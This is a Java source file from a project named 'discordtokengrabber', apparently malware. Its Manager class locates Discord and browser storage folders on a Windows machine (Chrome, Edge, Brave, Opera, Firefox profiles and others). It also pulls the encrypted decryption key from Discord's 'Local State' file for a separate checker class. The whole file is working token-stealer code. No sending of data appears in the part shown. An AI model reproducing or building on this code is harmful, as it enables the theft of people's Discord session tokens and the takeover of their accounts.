package com.github.dedinc.discordtokengrabber.utils;

import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.FileReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;

public class Manager {

    public final String ROAMING = System.getenv("APPDATA");
    public final String LOCAL = System.getenv("LOCALAPPDATA");
    public ArrayList<String> paths = new ArrayList<String>();

    public ArrayList<String> getPaths() {
        addPath(Paths.get(LOCAL, "360Browser", "Browser", "User Data", "Default"));
        addPath(Paths.get(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"));
        addPath(Paths.get(LOCAL, "CocCoc", "Browser", "User Data", "Default"));
        addPath(Paths.get(LOCAL, "Epic Privacy Browser", "User Data", "Default"));
        addPath(Paths.get(LOCAL, "Google", "Chrome Beta", "User Data", "Default"));
        addPath(Paths.get(LOCAL, "Google", "Chrome", "User Data", "Default"));
        addPath(Paths.get(LOCAL, "Microsoft", "Edge", "User Data", "Default"));
        addPath(Paths.get(LOCAL, "Vivaldi", "User Data", "Default"));
        addPath(Paths.get(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default"));
        addPath(Paths.get(ROAMING, "Opera Software", "Opera GX"));
        addPath(Paths.get(ROAMING, "Opera Software", "Opera Stable"));
        addPath(Paths.get(ROAMING, "discord"));
        addPath(Paths.get(ROAMING, "discordcanary"));
        addPath(Paths.get(ROAMING, "discordptb"));
        parseFirefoxProfiles(Paths.get(ROAMING, "Mozilla", "Firefox"));
        return paths;
    }

    public void addPath(Path path) {
        if (path.toFile().exists()) {
            String fpath = path.toFile().getAbsolutePath().toLowerCase();
            if (fpath.contains("roaming") && fpath.contains("discord")) {
                try {
                    try (BufferedReader br = new BufferedReader(new FileReader(Paths.get(path.toString(), "Local State").toFile()))) {
                        String line;
                        while ((line = br.readLine()) != null) {
                            Checker.osKey = new JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key");
                        }
                    }
                } catch (Exception e) {}
            }
            paths.add(path.toString());
        }
    }

    public void parseFirefoxProfiles(Path path) {
        if (path.toFile().exists()) {
            try {
                Files.list(Paths.get(path.toString(), "Profiles"))
                        .limit(100)
                        .forEach(folder -> {
                            if (folder.toFile().getName().endsWith("release")) {
                                try {
                                    Files.list(Paths.get(folder.toFile().getAbsolutePath(), "storage", "default"))
                                            .limit(100)
                                            .forEach(file -> {
                                                if (file.toFile().getName().contains("discord")) {
                                                    addPath(Paths.get(file.toFile().getAbsolutePath(), "ls"));
                                                }
                                            });
                                } catch (Exception e) {}
                            }
                        });
            } catch (Exception e) {}
        }
    }
}
